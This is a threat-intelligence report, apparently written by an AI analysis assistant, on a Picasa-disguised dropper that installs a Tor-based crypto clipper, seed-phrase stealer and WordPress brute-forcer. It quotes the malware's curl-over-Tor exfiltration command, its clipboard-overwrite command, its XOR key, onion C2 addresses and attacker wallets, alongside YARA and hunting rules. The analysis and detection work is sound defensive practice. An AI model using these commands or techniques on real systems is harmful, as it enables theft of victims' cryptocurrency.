# CTI Report: Picasa-Themed Dropper for Tor-Based Crypto Clipper / Seed Stealer / WordPress Brute-Forcer (sample.exe)

*TLP:AMBER — internal distribution*

## Contents

- [Executive Summary](#executive-summary)
- [Sample Snapshot](#sample-snapshot)
- [Malware Family Identification](#malware-family-identification)
- [Component Inventory](#component-inventory)
- [Runtime Requirements](#runtime-requirements)
- [Sources](#sources)
- [Capabilities](#capabilities)
- [Indicators of Compromise](#indicators-of-compromise)
- [Analysis Details](#analysis-details)
- [What We Don't Know](#what-we-dont-know)
- [Detection Engineering](#detection-engineering)
- [About this Report](#about-this-report)
- [Appendix: Analysis Environment](#appendix-analysis-environment)

## Executive Summary

`sample.exe` is a PyInstaller-packaged (Python 3.13), PyArmor-protected Windows dropper that disguises itself as Google Picasa (matching application icon, no legitimate publisher metadata). On execution it stages a `data_p002` payload set that was fully encrypted with a **12-byte repeating XOR key, `QBMyXPrHveOS`**, recovered in this analysis via a known-plaintext attack against a Windows Scheduled Task XML file. The same key decrypts every payload component, revealing a complete, previously opaque attack chain:

1. **Persistence**: a Scheduled Task (`002.xml`) runs `wscript.exe` against a dropped `.js` file every minute, indefinitely (`PT1M` interval, ~11-year duration), from `%AppData%\...\AccountPictures\<folder>\<name>.js`.
2. **Bundled Tor client**: `uusd.exe` decrypts to a genuine, unmodified **Tor Project** executable ("Copyright (c) 2007-2021, The Tor Project, Inc.") used to run a local SOCKS5 proxy on `localhost:9050`, giving the JScript payloads covert `.onion` command-and-control.
3. **Crypto wallet seed-phrase stealer + clipboard hijacker ("clipper")** (`002_n.js`, JScript/WSH): polls the Windows clipboard, detects BIP-39 mnemonic seed phrases using a bundled 2048-word wordlist (`002w.txt`, the standard BIP-39 English list), exfiltrates any match over Tor, and separately detects copied cryptocurrency addresses (BTC legacy/P2SH/Bech32, TRON, Monero) and silently replaces them on the clipboard with a visually similar attacker-controlled address drawn from a bundled pool of ~40,000 pre-generated addresses (`002a.txt`) chosen to share the victim address's prefix/suffix ("address poisoning"). The same script polls its C2 for commands and can self-update.
4. **WordPress site brute-forcing bot** (`002_b.js`, JScript/WSH): a second, independent module that attempts XML-RPC (`metaWeblog.newPost`) and REST (`wp-json`) logins against WordPress sites using rotating spoofed browser User-Agent strings, reporting results back to its own `.onion` C2.
5. **Generic encrypted-payload loader** (`pack.js`): a small stub that base64-decodes and XOR-decrypts a `%D%`/`%P%`-templated blob and `eval()`s it — used by the (still PyArmor-protected) installer logic to deliver additional payload content at drop time that is not present in this static sample.

This architecture — a JScript clipper polling the clipboard roughly continuously, launching a renamed/bundled Tor binary for a local SOCKS proxy, registering a victim GUID with a hidden-service C2, detecting and exfiltrating BIP-39 seed phrases, and address-poisoning the clipboard — closely matches Microsoft's June 2026 writeup of **Trojan:Win32/CryptoBandits.A** (Microsoft Security Blog, "Crypto Clipper uses Tor and worm-like propagation for persistence and control," 2026-06-17), which documents the same `localhost:9050` SOCKS proxy usage, victim GUID registration, and BIP-39 clipboard scanning. This sample's initial-access vector (a trojanized Picasa-themed PyInstaller/PyArmor installer) differs from the USB `.lnk`-based propagation Microsoft documented, and this sample additionally bundles a WordPress brute-forcing module not mentioned in that report — consistent with either a different distribution front-end for the same crimeware kit, or a related/derivative kit built on shared JScript code. Attribution to CryptoBandits.A is assessed at **medium confidence** on TTP/code-pattern similarity; it is not a confirmed hash or code match.

## Sample Snapshot

|  |  |
|---|---|
| **Malware Family** | Matches TTPs of Microsoft-tracked **Trojan:Win32/CryptoBandits.A** (Tor-based clipper/seed-stealer), medium confidence. Additional bundled WordPress-brute module is not documented in that report. |
| **Key Capabilities** | Clipboard-based crypto address hijacking ("address poisoning"); BIP-39 seed-phrase detection and exfiltration; Tor hidden-service C2 with victim GUID registration and remote command polling; self-update; WordPress XML-RPC/REST credential brute-forcing; scheduled-task persistence (1-minute interval, ~11-year duration). |
| **Target Platform** | Windows x86-64; JScript payloads execute under `wscript.exe` (Windows Script Host). |
| **Primary Artifact** | Outer loader — SHA-256 `99076f5c4404f5ead7b4489b055ea199d6e145ab7194e3e3fa4a8fe2634f6bb9` (`sample.exe`). |
| **Infection Vector** | Not directly observed; delivered as a Picasa-themed fake installer (trust-abuse masquerading). Publicly documented relatives of this toolkit propagate via malicious USB `.lnk` shortcuts. |

## Malware Family Identification

| Family | Basis | Confidence |
|---|---|---|
| Trojan:Win32/CryptoBandits.A (Microsoft) | Code-pattern/behavioral match: bundled/renamed Tor client providing `localhost:9050` SOCKS proxy; JScript/`ActiveXObject`-driven clipboard polling; BIP-39 seed-phrase detection with local backup file before exfiltration; victim GUID registered with a `.onion` C2; remote command polling | Medium |
| (unnamed) WordPress XML-RPC/REST brute-force module | Independently observed in `002_b.js`; not present in the Microsoft CryptoBandits.A writeup summarized during this analysis — may be a bundled add-on module unique to this build/distributor | Low (as a distinct named family; capability itself is confirmed) |

## Component Inventory

| Role | File Name | File Type | Notes |
|---|---|---|---|
| Outer loader / dropper | `sample.exe` | PE32+ GUI x86-64, PyInstaller onefile (Python 3.13) | Entry point `installer.pyc`, PyArmor-protected (`pyarmor_runtime_000000`, PyArmor 8.x "Gen" mode — Rust-compiled VM runtime, not statically decompilable); icon mimics Google Picasa. |
| Persistence config | `data_p002/002.xml` (decrypted) | UTF-16LE Windows Scheduled Task XML | Runs `wscript.exe "<AppData>\...\AccountPictures\%FOLD%\%NAME%.js"` every 1 minute for ~11 years (`PT1M` / `PT99998H58M`); `%FOLD%`/`%NAME%` are drop-time template placeholders. |
| Bundled Tor client | `data_p002/uusd.exe` (decrypted) | PE32+ console x86-64 | Genuine, unmodified Tor Project binary ("Copyright (c) 2007-2021, The Tor Project, Inc."); provides local SOCKS5 proxy on `127.0.0.1:9050` for `.onion` C2 traffic. Timestamp zeroed. |
| Clipper / seed-stealer / backdoor | `data_p002/002_n.js` (decrypted) | JScript (WSH), commercial `javascript-obfuscator` output | See [Capabilities](#capabilities). References local support files `GUID`, `NAME`, `GOOD`, `crypto.inf`, `cinfo.inf`, and reads `002a.txt`/`002w.txt` from its own script directory. |
| WordPress brute-forcer | `data_p002/002_b.js` (decrypted) | JScript (WSH), commercial `javascript-obfuscator` output | XML-RPC/REST WordPress login brute-forcing with rotating spoofed User-Agent strings; reports to its own `.onion` C2. |
| Generic encrypted-eval loader | `data_p002/pack.js` (decrypted) | JScript, small obfuscated stub | Base64-decodes + XOR-decrypts a `%D%`/`%P%` templated blob and `eval()`s it; delivery mechanism for content not present in this static sample. |
| Address-poisoning wordlist | `data_p002/002a.txt` (decrypted) | Plaintext, ~1.45M chars | ~40,000 attacker-controlled cryptocurrency addresses: 9,999 BTC P2PKH (`1...`), 10,000 BTC P2SH (`3...`), 10,000 BTC Bech32 (`bc1...`), 9,999 TRON (`T...`); referenced by `002_n.js` for clipboard address substitution. |
| Seed-phrase detection wordlist | `data_p002/002w.txt` (decrypted) | Plaintext, 2048 lines | Standard **BIP-39 English wordlist** ("abandon"..."zoo"); referenced by `002_n.js`'s `CheckStrForSeed()`. |
| Build-artifact blob (low value) | `campus.py` | ASCII text (base64) → RAR-signed blob (does not open) | Decodes to data beginning with the RAR magic bytes; references `pyinstaller-6.20.0/bootloader/build`. Assessed as accidental attacker build-cache leakage, not an active payload. |

**Flow (confirmed via static decryption/deobfuscation):**
`sample.exe` (PyInstaller bootloader) → executes PyArmor-protected `installer.pyc` → decrypts `data_p002/*` (12-byte XOR key `QBMyXPrHveOS`) and drops them under `%AppData%\...\AccountPictures\<folder>\`, including the renamed Tor binary → registers `002.xml` as a Scheduled Task → task launches `wscript.exe` against the dropped JS payload(s) every minute → JS payload launches the local Tor client, waits for bootstrap, generates/reads a victim GUID, and begins polling its `.onion` C2 while continuously monitoring the clipboard for wallet seed phrases and addresses.

## Runtime Requirements

- Windows x86-64. Outer dropper is a self-contained PyInstaller onefile bundle (Python 3.13 runtime, MSVC 2022 bootloader) requiring no pre-installed Python.
- JScript payloads (`002_n.js`, `002_b.js`, `pack.js`) execute under the native Windows Script Host (`wscript.exe`) and rely on `ActiveXObject` (`WScript.Shell`, `Scripting.FileSystemObject`, `MSXML2.ServerXMLHTTP.6.0`, `htmlfile`) — standard on all supported Windows versions, no additional runtime needed.
- Network egress via `curl.exe` (assumed present or dropped; invoked directly by the JScript via `WScript.Shell.Run`) tunneled through the locally-run Tor client's SOCKS5 proxy at `127.0.0.1:9050`.
- No TLS directory, no digital signature on `sample.exe` (unsigned); the bundled `uusd.exe`/Tor binary is a genuine open-source build.

## Sources

Single sample provided directly for analysis (`/home/remnux/files/samples/sample.exe`, uploaded to the REMnux analysis VM). No prior telemetry, third-party sharing, or seed intelligence was supplied. OSINT checks performed: Team Cymru Malware Hash Registry (SHA-256, non-disclosing — no match), and web search for the outer SHA-256 and for distinctive recovered JScript identifiers/strings (`PingToOnion`, `CheckStrForSeed`, `MakeREPL`, `GetClipboard`/`SetClipboard` + `htmlfile.parentWindow.clipboardData`, BIP-39 + Tor clipper). The latter search surfaced Microsoft's June 2026 public writeup on Trojan:Win32/CryptoBandits.A, used here as a comparison reference, not as ground truth for this specific sample.

## Capabilities

| MBC Behavior | Procedure Observed | Notes |
|---|---|---|
| Anti-Static Analysis | PyArmor 8.x "Gen"-mode protection of `installer.pyc` (Rust-compiled custom VM runtime — no plaintext bytecode recoverable); all `data_p002` payloads stored fully encrypted (12-byte repeating XOR) | Outer dropper logic that performs the actual decryption/drop remains unrecovered; payload content was recovered by independently cryptanalyzing the ciphertext, not by decompiling the dropper. |
| Persistence | Scheduled Task (`schtasks`-equivalent XML), `TimeTrigger` with `PT1M` repetition and `PT99998H58M` duration, `Enabled=true`, runs `wscript.exe <payload>.js` | Confirmed via full decryption of `002.xml`. |
| Command and Control | Tor hidden-service C2 over locally-proxied SOCKS5 (`127.0.0.1:9050`), reached via `curl.exe --socks5-hostname localhost:9050 <onion-url>` from JScript; victim identified by a locally generated/stored GUID (`GUID` file) sent as `BRUT=<guid>&version=2.1&action=...&data=...` (WP-brute module) or via `PingToOnion(cmd, data)` (clipper module) | Three distinct `.onion` endpoints recovered (clipper stub/config, clipper ping, WP-brute) — see [IOCs](#indicators-of-compromise). |
| Collection — Credential/Wallet Theft | `CheckStrForSeed(clipboardText, bip39wordlist)` matches clipboard contents against the 2048-word BIP-39 list to detect 12/24-word mnemonic seed phrases; on match, writes a local backup (`writeGOODToFile`) then loops `PingToOnion("SEED", seed)` until the C2 acknowledges | Confirmed by full JScript deobfuscation. |
| Collection/Impact — Clipboard Hijacking ("Clipper") | Regex/length-based detection of copied BTC (`1...`/`3...`/`bc1q...`/`bc1p...`), TRON (`T...`), and Monero (`4...`/`8...`) addresses; `MakeREPL()` selects a look-alike replacement address (same 2-char prefix/suffix where possible) from the 40,000-address pool in `002a.txt`, indexed by prefix/suffix for visual similarity, and overwrites the clipboard via `cmd.exe /c echo|set /p=<addr>|clip` | Hardcoded single-address fallbacks are also present per currency (see IOCs) for cases where no prefix/suffix-matched pool entry exists. |
| Discovery | WMI queries (`SELECT * FROM Win32_...`), `taskkill /F /PID`, process enumeration via `Enumerator`/`WScript.Shell`, GeoIP/system-info collection to `cinfo.inf` | Present in `002_n.js`. |
| Execution / Remote Control | `CheckOnionCMD()` polls C2 for commands; a response starting with `U` and ending with `!` triggers `_installUpdate()` (self-update); `runGatewayProc`/`killGatewayProc`/`LoadREPL`/`OnionToFile` manage the local Tor gateway process lifecycle | Confirmed by deobfuscated JScript; exact remote-command set beyond "update" was not fully enumerated in this pass. |
| Brute Force (separate module) | `WPTryPost()` issues WordPress `xmlrpc.php` (`metaWeblog.newPost`) and `/wp-json/...` requests with credential guesses and randomized/spoofed `User-Agent` strings (Chrome/Firefox/Safari/Edge/Opera across Windows/macOS/Linux/Android, x86/x64/arm64) | Independent module (`002_b.js`) with its own `.onion` C2 and `BRUT=` reporting protocol; purpose consistent with building a pool of compromised WordPress sites (e.g., for further malware hosting or SEO abuse), not directly tied to the clipper. |

## Indicators of Compromise

*Defanged per convention.*

| Type | Indicator | Context |
|---|---|---|
| Hash Values | SHA-256 `99076f5c4404f5ead7b4489b055ea199d6e145ab7194e3e3fa4a8fe2634f6bb9` / MD5 `6fe286907a6a28e94425df612efe40c7` / SHA-1 `817e55643d4e3f3136f1b176be7fbe98f8360960` / imphash `dcaf48c1f10b0efa0a4472200f3850ed` | Role: Outer loader / dropper (`sample.exe`) |
| Hash Values | SHA-256 `ab7bb2724342bc69833c355b9d0eb7f8a17fce81b1b45a22baadd184d1fa689b` (encrypted) / decrypted `6b866c187a0dee2fb751a8990d50dc1ed83f68e025720081e4d8e27097067dc8` | Role: Bundled Tor client (`data_p002/uusd.exe`) |
| Network Artifacts | `curl -X POST --socks5-hostname localhost:9050 <onion-url>` invoked via `WScript.Shell.Run` from `wscript.exe` | Distinctive host-based C2 pattern for hunting (Sysmon process-creation on `curl.exe` with `--socks5-hostname` args spawned by `wscript.exe`). |
| Domain Names (.onion) | `swjxev2rvxfivi2wvkxre5vaxkjeepxzxva4u4ydm2qbkbakh6wnyead[.]onion` (`/core/repla.php`) | Role: Clipper module `STUB_URL` (`002_n.js`) |
| Domain Names (.onion) | `hek5ensy7wqqls2cafflihs7sdqr4dwxux47vp3k7pgffeasxsfeeyid[.]onion` (`/route.php`) | Role: Clipper module `PING_URL`/`FILE_URL` (`002_n.js`) |
| Domain Names (.onion) | `gfoqsewps57xcyxoedle2gd53o6jne6y5nq5eh25muksqwzutzq7b3ad[.]onion` (`/route.php`) | Role: WordPress brute-force module C2 (`002_b.js`), `BRUT=<guid>&version=2.1&action=...&data=...` protocol |
| Host Artifacts | Files dropped alongside the JScript payloads in their working directory: `GUID`, `NAME`, `GOOD`, `crypto.inf`, `cinfo.inf`, `002a.txt`, `002w.txt` | Local state/backup files referenced by `002_n.js`; `GOOD` holds a locally backed-up stolen seed phrase before exfiltration succeeds. |
| Host Artifacts | Scheduled Task launching `wscript.exe "<...>\AccountPictures\<FOLD>\<NAME>.js"` every 1 minute (`PT1M`), duration `PT99998H58M` | From decrypted `002.xml`; `<FOLD>`/`<NAME>` are victim-specific template values substituted at drop time (not present in this static sample). |
| Host Artifacts | Fallback hardcoded replacement addresses used by the clipper when no prefix/suffix-matched pool entry exists: BTC P2PKH `12FfZsjyDri1ir3EUU85pRE5quUEPY5Qf4`; BTC P2SH `32ozR62LxL6ynHYBHZhCz5faRjhYrmNheW`; BTC Bech32 `bc1qz33n9xuqkxl7wxy8j0n4haapr73w64umdj7tw0`; TRON `TAwHPzmZC7rvCKiLmRnr458xZH1D8M5c82`; Monero `87Y35DbRFf2G2PyghoVAox4tsxfxqwjZh3AMaxrkjasBNW4rmQWs9hfanP5haACxfnXrKPZoesSP18XciY8xVaoY5MLitaW` | These are the attacker's own receiving addresses — high-value pivots for blockchain-analysis follow-up (fund tracing), separate from the ~40,000-address lookalike pool in `002a.txt`. |

## Analysis Details

### Automated Analysis

Performed via the REMnux MCP toolchain (`analyze_file`, `pyinstxtractor-ng`, `pycdc`, `floss`, `brxor.py`, `exiftool`, `pestr`) plus extensive ad hoc Python cryptanalysis and a custom Node.js `javascript-obfuscator` string-call resolver (see below) run via `run_tool`.

### Static Properties Analysis / Decryption Methodology

1. **Cipher identification.** All seven `data_p002/*` files failed to parse as their nominal type and showed moderate entropy (5.4–7.6 bits/byte — well below the ~8.0 expected for strong/modern encryption of already-compressed or random data). Single-byte XOR brute force (`brxor.py`, custom scoring) found no candidate key. Autocorrelation and an index-of-coincidence scan across candidate key lengths 1–64 on the largest file identified a clear periodicity at **12 bytes** (confirmed independently by locating exact-period recurrence of literal ciphertext bytes in `002.xml`).
2. **Known-plaintext key recovery.** Standard Windows Scheduled Task XML files written by MSXML are UTF-16LE with a leading BOM (`FF FE`) followed by `<?xml version="1.0"...`. Using this as a crib against `002.xml`'s ciphertext and the confirmed 12-byte period yielded the complete key with no ambiguity: **`QBMyXPrHveOS`** (ASCII).
3. **Validation.** The same key, applied as a simple repeating XOR, correctly decrypted all remaining `data_p002` files: `002_b.js`/`002_n.js`/`pack.js` became valid JScript source; `002a.txt` became a plaintext list of ~40,000 real-format cryptocurrency addresses; `002w.txt` became the exact standard BIP-39 English wordlist; and `uusd.exe` became a valid `MZ`/PE32+ executable identifying itself as the Tor Project's `tor.exe`. This cross-validation across seven independently structured files using one key rules out coincidence.
4. **JScript deobfuscation.** `002_b.js`, `002_n.js`, and `pack.js` are output from a commercial `javascript-obfuscator`-style tool (array-shuffle string table, per-scope decoder aliasing, `_0x`-prefixed identifiers). A custom Node.js `vm`-sandboxed resolver was built that (a) executes the file's top-level array/rotator/decoder bootstrap with inert stubs for `ActiveXObject`/`WScript`/DOM globals so no real action occurs, (b) statically extracts and pre-applies every per-scope decoder alias assignment (`_0xabc=_0xdef;`) found anywhere in the source so nested-function-local decoder names resolve too, then (c) replaces every decoder call site with its literal string value. This achieved 100% resolution of all `_0x...(...)` string-decoder calls in all three files, without ever invoking the scripts' real (`ActiveXObject`-backed) logic.

### Behavioral Analysis

Not performed by direct execution/detonation. All findings above were obtained by static decryption and deobfuscation of the payload content; the JScript's documented API calls (`ActiveXObject('WScript.Shell').Run`, clipboard get/set, `curl.exe` invocation) describe what the code will do when interpreted by `wscript.exe`, not runtime-observed behavior in a sandbox.

### Code Analysis

See Component Inventory and Capabilities for the reconstructed logic of `002_n.js` (clipper/seed-stealer/backdoor) and `002_b.js` (WordPress brute-forcer). Full deobfuscated JScript sources are retained in the analysis environment (`002_b.js.resolved.js`, `002_n.js.resolved.js`, `pack.js.resolved.js`) for detailed follow-up review; not reproduced in full here for length.

The outer dropper's own decryption/drop routine (inside PyArmor-protected `installer.pyc`) was **not** recovered — the XOR key and payload structure were obtained purely by cryptanalyzing the ciphertext, independent of the protected dropper logic.

## What We Don't Know

- **The outer dropper's exact drop mechanism** — how/where `installer.pyc` writes files, fills the `%FOLD%`/`%NAME%` template placeholders, and whether it performs additional PyArmor-protected actions beyond staging `data_p002`. This remains behind PyArmor 8.x protection.
- **The full remote command set** accepted by `CheckOnionCMD()` beyond the observed `U...!` self-update trigger.
- **Content delivered via `pack.js`'s `%D%`/`%P%` template mechanism** — this sample only contains the loader stub, not a filled-in payload.
- **Live status of the three `.onion` C2 addresses** — not probed (would be a disclosing/active action against attacker infrastructure).
- **True initial-infection vector for this specific sample** (only the Picasa-masquerade lure was observed; not confirmed how it reaches victims).

## Detection Engineering

Behavioral hunting guidance (log-source dependent — process creation / command-line logging, e.g., Sysmon Event ID 1):

| Detection Content | Notes |
|---|---|
| Process creation: `wscript.exe` with a command line pointing into a path containing `AccountPictures`, spawned by (or shortly after) a Scheduled Task Service (`svchost.exe -k netsvcs -p -s Schedule`) | Matches this sample's persistence mechanism; `AccountPictures` under `%AppData%`/`%LocalAppData%` is not a legitimate script-hosting location. |
| Process creation: `curl.exe` (or similar) with `--socks5-hostname localhost:9050` (or `127.0.0.1:9050`) in its command line, parent process `wscript.exe` | Distinctive to this JScript's C2 mechanism; flags any script silently using a local Tor SOCKS proxy. |
| Process creation: an unsigned/renamed executable (e.g., not named `tor.exe`) whose strings/version info identify it as "The Tor Project, Inc." running from a non-standard user-writable directory | Catches the "bundled/renamed Tor client" technique generically, independent of this sample's specific `uusd.exe` name. |
| Scheduled Task registration with `TimeTrigger` interval `PT1M` and duration near the Windows maximum (`PT99998H58M`) executing `wscript.exe` against a `.js` file | Distinctive combination; legitimate scheduled tasks rarely use a 1-minute interval for ~11 years. |
| YARA (static, on JScript/plaintext payload, i.e., post-decryption or extracted from a similar dropper): match on literal strings `PingToOnion`, `CheckStrForSeed`, `MakeREPL`, `readGUIDFromFile`, `GetClipboard`, co-occurring with `ActiveXObject('htmlfile')` and `clipboardData` | See below for a starter rule; strings are obfuscated in the delivered form, so this rule targets already-decrypted/deobfuscated content (e.g., from memory, temp files, or a sandbox). |

```yara
rule JS_TorClipper_CryptoBandits_like
{
    meta:
        description = "Deobfuscated JScript Tor clipper / BIP-39 seed stealer matching CryptoBandits.A-like TTPs"
        reference = "sample.exe 99076f5c4404f5ead7b4489b055ea199d6e145ab7194e3e3fa4a8fe2634f6bb9"
        date = "2026-07-25"
    strings:
        $s1 = "PingToOnion" ascii
        $s2 = "CheckStrForSeed" ascii
        $s3 = "MakeREPL" ascii
        $s4 = "readGUIDFromFile" ascii
        $s5 = "clipboardData" ascii
        $s6 = "--socks5-hostname" ascii
        $s7 = "9050" ascii
    condition:
        4 of them
}

rule Data_XOR12_QBMyXPrHveOS
{
    meta:
        description = "Payload encrypted with the 12-byte repeating XOR key observed in the Picasa-loader / CryptoBandits-like clipper toolkit"
        date = "2026-07-25"
    strings:
        // First 12 ciphertext bytes of the BOM+"<?xml" crib XORed with key QBMyXPrHveOS is sample-specific;
        // instead match the raw key itself where it may appear unencrypted in a related dropper.
        $key = "QBMyXPrHveOS" ascii
    condition:
        $key
}
```

## About this Report

|  |  |
|---|---|
| **Report Title** | Picasa-Themed Dropper for Tor-Based Crypto Clipper / Seed Stealer / WordPress Brute-Forcer (sample.exe) |
| **Author(s) and Organization** | Malware analysis assistant (REMnux MCP-driven), for internal CTI use |
| **Publication Date** | 2026-07-25 |
| **Report Classification** | TLP:AMBER |
| **Follow-Up Contact** | lucien.lagarde@gmail.com |

### Report Changelog

| **Date** | **Author** | **Change Description** |
|---|---|---|
| 2026-07-25 | Malware analysis assistant | Initial report based on static analysis and PyInstaller extraction (dropper only; payload encrypted/unrecovered). |
| 2026-07-25 | Malware analysis assistant | Major update: recovered the 12-byte XOR key via known-plaintext attack, decrypted and deobfuscated all `data_p002` payloads, fully characterized the clipper/seed-stealer/backdoor and WordPress brute-force modules, identified the bundled Tor client, and matched TTPs to Microsoft's Trojan:Win32/CryptoBandits.A. |

## Appendix: Analysis Environment

Analysis performed on a REMnux malware-analysis VM (`172.16.183.133`) via the `remnux` MCP server, using: `peframe`, `diec`, `capa`, `pestr`, `portex`, `yara-forge`, `pecheck`, `pescan`, `signsrch`, `manalyze`, `exiftool`, `pyinstxtractor-ng`, `pycdc`, `floss`, `brxor.py`, and Node.js v22 (for a custom `javascript-obfuscator` string-resolver script uploaded via `upload_from_host`), plus extensive ad hoc Python (entropy/index-of-coincidence analysis, known-plaintext XOR key recovery, base64 decoding) via `run_tool`. No sandbox detonation or debugger-assisted dynamic analysis was performed; all payload content was recovered through static cryptanalysis and deobfuscation.
